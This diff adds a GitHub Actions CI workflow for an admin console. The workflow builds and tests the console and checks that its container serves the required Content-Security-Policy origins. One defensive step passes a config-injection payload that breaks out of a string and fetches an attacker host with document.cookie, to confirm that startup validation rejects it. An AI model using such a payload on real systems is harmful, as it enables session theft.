@@ -1,0 +1,254 @@
+name: Admin UI
+
+on:
+  pull_request:
+    paths:
+      - "Iverson.AdminUI/**"
+      # This workflow guards itself too: a change here must be able to run.
+      - ".github/workflows/admin-ui.yml"
+
+# Least-privilege default: both jobs here only check out the repo, install and build
+# it, and build/run a container from a locally built image -- neither needs to write
+# anywhere (no packages are published, no comments are posted, no caches are saved).
+permissions:
+  contents: read
+
+jobs:
+  build-test:
+    runs-on: ubuntu-latest
+    defaults:
+      run:
+        working-directory: Iverson.AdminUI
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up Node
+        uses: actions/setup-node@v4
+        with:
+          # Pinned to the same major as Iverson.AdminUI/Dockerfile's build stage, which
+          # is itself pinned to the floor recorded in package.json's engines.node
+          # (>=22.22.0, from react-router@8.3.0). If one of those three moves, move all
+          # three.
+          node-version: "22"
+          # NO `cache: npm` HERE, DELIBERATELY -- DO NOT ADD ONE.
+          #
+          # This job exists because `npm ci` against a cold cache is the ONLY thing in
+          # this repo that re-validates the peer-dependency graph. The release blocker
+          # that prompted this workflow (@vitejs/plugin-react@4.7.0 peering at vite <= 7
+          # while package.json pinned vite ^8.1.5) was invisible to every local
+          # `npm install` against a warm node_modules, and stayed invisible until a
+          # clean checkout ran `npm ci` and hit ERESOLVE. A restored ~/.npm cache does
+          # not by itself skip peer resolution, but caching is the first step toward
+          # skipping install work altogether, and the seconds saved are not worth
+          # blunting the one check that would have caught it.
+
+      - name: npm ci (cold, no cache -- see the setup-node step)
+        run: |
+          set -e
+          echo "::group::npm ci"
+          npm ci
+          echo "::endgroup::"
+
+      - name: npm run build
+        run: |
+          set -e
+          echo "::group::npm run build"
+          npm run build
+          echo "::endgroup::"
+
+      - name: npm test
+        # vitest.config.ts sets fileParallelism: false and this job deliberately does
+        # NOT override it. The setting was measured on a 4-core box (load average 2.6
+        # serial vs 22 parallel, with waitFor timeouts appearing as random-file flake
+        # under that contention); a GitHub-hosted ubuntu-latest runner is also 4 vCPU,
+        # so it is the same machine shape and wants the same setting. The ~20s cost
+        # (70s -> 90s) is cheaper than one flaky-rerun cycle.
+        run: |
+          set -e
+          echo "::group::npm test"
+          npm test
+          echo "::endgroup::"
+
+      - name: TypeScript errors must not increase beyond the recorded baseline
+        # This package has 7 pre-existing type errors (4 x `import.meta.env` needing
+        # vite/client types, 3 x react-router's dropped `future` prop) and has never had
+        # a type-check gate, so `npx tsc --noEmit` cannot simply be made blocking -- it
+        # would turn every PR red on day one.
+        #
+        # A ratchet is used instead of a non-blocking informational run, because a step
+        # that can never fail is not a check. This one fails the moment an eighth error
+        # appears, which is the regression worth catching, and stays green until then.
+        # Its known weakness: it counts errors, so it would not notice 7 errors being
+        # traded for 7 different ones. That is an accepted trade for a gate that can go
+        # in today; the fix is to drive the baseline to 0 and make tsc blocking.
+        #
+        # BASELINE: 7. Every tsc diagnostic emits its file:line prefix and "error TSxxxx"
+        # on ONE line -- continuation lines (e.g. "Property 'future' does not exist...")
+        # are indented and carry no "error TS" -- so the grep count is exactly the
+        # diagnostic count. Lower this number when errors are fixed; the step tells you
+        # when it is stale.
+        run: |
+          set -e
+          BASELINE=7
+          echo "::group::npx tsc --noEmit"
+          # tsc exits non-zero whenever there is at least one error, which is the normal
+          # state here, so its exit code carries no information -- the count does.
+          npx tsc --noEmit > tsc-output.txt 2>&1 || true
+          cat tsc-output.txt
+          echo "::endgroup::"
+          COUNT=$(grep -cE "error TS[0-9]+" tsc-output.txt || true)
+          echo "tsc errors: $COUNT (baseline $BASELINE)"
+          if [ "$COUNT" -gt "$BASELINE" ]; then
+            echo "::error::npx tsc --noEmit reports $COUNT errors, up from the recorded baseline of $BASELINE. Fix the new type errors, or -- only if the baseline is genuinely wrong -- update BASELINE in .github/workflows/admin-ui.yml."
+            exit 1
+          fi
+          if [ "$COUNT" -lt "$BASELINE" ]; then
+            echo "::notice::npx tsc --noEmit reports $COUNT errors, below the recorded baseline of $BASELINE. Lower BASELINE in .github/workflows/admin-ui.yml to $COUNT so the ratchet keeps its grip."
+          fi
+
+  image-contract:
+    runs-on: ubuntu-latest
+    # Two controls in this image are load-bearing and nothing else in the repo would
+    # notice them regressing: docker-entrypoint.sh's value validation (which stops an
+    # OIDC_AUTHORITY containing a double quote from closing its string literal in
+    # config.js and becoming code that runs on every page load of a page holding the
+    # operator's session and access token), and the Content-Security-Policy that names
+    # the admin-api and Authentik origins the console must reach. Both only exist at
+    # CONTAINER START, so only a real image build and a real container can test them.
+    env:
+      IMAGE: iverson-adminui-ci:${{ github.sha }}
+      CONTAINER: iverson-adminui-ci
+      # Distinctive per-origin hostnames under .invalid (RFC 2606 -- guaranteed never
+      # to resolve, so nothing here can reach a real host). They differ from each other
+      # so that a CSP which dropped one of them cannot still match on the other.
+      API_ORIGIN: http://admin-api.ci.invalid
+      IDP_ORIGIN: http://authentik.ci.invalid
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Build the admin console image
+        # The repo root is the build context on purpose: the build stage also copies
+        # Iverson.Clients/Common/Proto, which lives outside Iverson.AdminUI/.
+        run: |
+          set -e
+          echo "::group::docker build"
+          docker build -f Iverson.AdminUI/Dockerfile -t "$IMAGE" .
+          echo "::endgroup::"
+
+      - name: The served CSP must name both origins in the directive that needs it
+        # Matched PER DIRECTIVE, not against the header as a whole. That is not
+        # pedantry -- it was falsified: dropping ${OIDC_ORIGIN} from connect-src alone
+        # (the regression that silently breaks OIDC discovery and the token exchange)
+        # leaves the Authentik origin present in frame-src, so a substring check over
+        # the whole header still matched and the check passed a genuinely broken image.
+        # Each directive is therefore split out and its origins matched as whole
+        # space-delimited tokens.
+        run: |
+          set -e
+          docker run -d --name "$CONTAINER" -p 127.0.0.1:8099:8080 \
+            -e OIDC_CLIENT_ID=ci-client \
+            -e "OIDC_AUTHORITY=$IDP_ORIGIN/application/o/iverson/" \
+            -e "API_BASE_URL=$API_ORIGIN" \
+            "$IMAGE"
+
+          # nginx accepts connections a moment before it serves them -- an unretried
+          # first curl was observed failing with "Recv failure: Connection reset by
+          # peer" against a container that was otherwise perfectly healthy.
+          for i in $(seq 1 30); do
+            if curl -fsS -o /dev/null http://127.0.0.1:8099/; then break; fi
+            if [ "$i" -eq 30 ]; then
+              echo "::error::the console container never served a 200 on / within 30s"
+              docker logs "$CONTAINER" || true
+              exit 1
+            fi
+            sleep 1
+          done
+
+          echo "::group::response headers"
+          curl -sS -D headers.txt -o /dev/null http://127.0.0.1:8099/
+          cat headers.txt
+          echo "::endgroup::"
+
+          # Case-insensitive on the header NAME only: HTTP header casing is not a
+          # contract, but the directive names and origins that follow are.
+          CSP=$(sed -n -E 's/^[Cc]ontent-[Ss]ecurity-[Pp]olicy:[[:space:]]*//p' headers.txt | tr -d '\r')
+          if [ -z "$CSP" ]; then
+            echo "::error::no Content-Security-Policy header was served. nginx.conf includes admin-ui-security-headers.inc, which docker-entrypoint.sh renders at container start -- one of those two is broken."
+            exit 1
+          fi
+          printf '%s\n' "$CSP" | tr ';' '\n' | sed -E 's/^[[:space:]]+//; s/[[:space:]]+$//' > directives.txt
+
+          assert_directive_names() {
+            _directive=$1
+            _origin=$2
+            _line=$(grep -E "^$_directive([[:space:]]|\$)" directives.txt || true)
+            if [ -z "$_line" ]; then
+              echo "::error::the Content-Security-Policy has no $_directive directive at all."
+              echo "served: $CSP"
+              exit 1
+            fi
+            case " $_line " in
+              *" $_origin "*) echo "OK: $_directive names $_origin" ;;
+              *)
+                echo "::error::the Content-Security-Policy's $_directive does not name $_origin. The console cannot reach an origin its CSP omits: connect-src without the admin-api origin breaks every widget fetch and the OTLP export, connect-src without the Authentik origin breaks OIDC discovery and the token exchange so login cannot complete, and frame-src without it blocks the iframe silent-renew fallback."
+                echo "served: $CSP"
+                exit 1
+                ;;
+            esac
+          }
+
+          assert_directive_names connect-src "$API_ORIGIN"
+          assert_directive_names connect-src "$IDP_ORIGIN"
+          assert_directive_names frame-src "$IDP_ORIGIN"
+
+      - name: A malformed value must abort startup instead of reaching config.js
+        # The payload puts the double quote in the URL's PATH, not its host. That is
+        # deliberate and load-bearing: origin_of() discards the path before the value
+        # reaches the CSP, so the quote can only do damage in config.js, where the
+        # template writes the value between double quotes. It also means nginx's own
+        # config parser is NOT what rejects this -- with the validation removed, nginx
+        # starts happily and serves a config.js that has been turned into code. So the
+        # assertion cannot settle for "exited non-zero", and that is not hypothetical:
+        # with the validate calls removed, this exact run was observed exiting 124
+        # (`timeout` killing a perfectly healthy container), which a bare non-zero check
+        # would have read as a pass. Exit 124 is therefore an explicit failure, and the
+        # logs must additionally show nginx never started.
+        run: |
+          set -e
+          docker rm -f "$CONTAINER" >/dev/null 2>&1 || true
+
+          set +e
+          OUTPUT=$(timeout 60 docker run --rm --name "$CONTAINER" \
+            -e OIDC_CLIENT_ID=ci-client \
+            -e 'OIDC_AUTHORITY=http://authentik.ci.invalid/";fetch("http://attacker.ci.invalid/"+document.cookie);"' \
+            -e "API_BASE_URL=$API_ORIGIN" \
+            "$IMAGE" 2>&1)
+          RC=$?
+          set -e
+
+          echo "::group::container output (exit $RC)"
+          echo "$OUTPUT"
+          echo "::endgroup::"
+
+          if [ "$RC" -eq 124 ]; then
+            echo "::error::the container was still running after 60s. A quote-bearing OIDC_AUTHORITY must abort startup; instead the container came up, which means docker-entrypoint.sh rendered that value into config.js as executable code."
+            docker rm -f "$CONTAINER" >/dev/null 2>&1 || true
+            exit 1
+          fi
+          if [ "$RC" -eq 0 ]; then
+            echo "::error::the container exited 0 on a quote-bearing OIDC_AUTHORITY. docker-entrypoint.sh must fail loudly (EX_CONFIG 78) so the base entrypoint's set -e aborts before exec'ing nginx."
+            exit 1
+          fi
+          case "$OUTPUT" in
+            *"start worker process"*)
+              echo "::error::nginx started despite a quote-bearing OIDC_AUTHORITY. The rejected value must stop the container, not serve a console whose config.js has been turned into code."
+              exit 1
+              ;;
+          esac
+          echo "rejected with exit $RC and nginx never started"
+
+      - name: Clean up
+        if: always()
+        run: |
+          docker rm -f "$CONTAINER" >/dev/null 2>&1 || true
+          docker rmi -f "$IMAGE" >/dev/null 2>&1 || true
